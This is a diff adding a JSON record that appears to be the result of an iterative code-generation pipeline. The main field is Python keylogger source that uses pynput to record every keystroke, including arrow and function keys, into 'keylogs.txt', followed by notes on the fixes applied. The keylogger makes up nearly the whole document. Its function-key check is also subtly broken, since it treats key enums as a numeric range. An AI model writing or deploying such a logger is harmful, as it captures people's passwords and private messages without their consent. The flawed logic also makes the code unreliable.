@@ -1,0 +1,9 @@
+{
+  "output": "from pynput.keyboard import Listener, Key\n\ndef on_press(key, f):\n    \"\"\"Handle key press events and write to a file.\"\"\"\n    try:\n        if hasattr(key, 'char'):\n            f.write(key.char)\n        elif key == Key.enter:\n            f.write('[ENTER]')\n        elif key == Key.space:\n            f.write('[SPACE]')\n        elif key == Key.tab:\n            f.write('[TAB]')\n        elif key == Key.backspace:\n            f.write('[BACKSPACE]')\n        elif key in [Key.up, Key.down, Key.left, Key.right]:\n            f.write(f'[{key.name.upper()}]')\n        elif key in range(Key.f1, Key.f13):\n            f.write(f'[{key.name.upper()}]')\n        elif key == Key.esc:\n            return False\n    except Exception as e:\n        print(f'Error writing to file: {e}')\n\ndef main():\n    \"\"\"\n    Set up the listener and manage the keylogging process.\n\n    This function sets up a Listener to capture keyboard inputs,\n    writes the captured keystrokes to 'keylogs.txt', and stops\n    when the ESC key is pressed. It handles regular characters,\n    special keys like arrow keys, F1-F12, ENTER, SPACE, TAB,\n    BACKSPACE, and logs them in a structured format.\n    \"\"\"\n    try:\n        with open('keylogs.txt', 'a') as f:\n            try:\n                with Listener(on_press=lambda key: on_press(key, f)) as listener:\n                    listener.join()\n            except Exception as e:\n                print(f'Error in setting up the listener: {e}')\n    except Exception as e:\n        print(f'Error opening file: {e}')\n\nif __name__ == '__main__':\n    main()",
+  "notes": "Added handling for arrow keys and F1-F12 keys, improved main function docstring.",
+  "applied_fixes": [
+    "iteration7_issue1",
+    "iteration7_issue2"
+  ],
+  "iterations": 8
+}
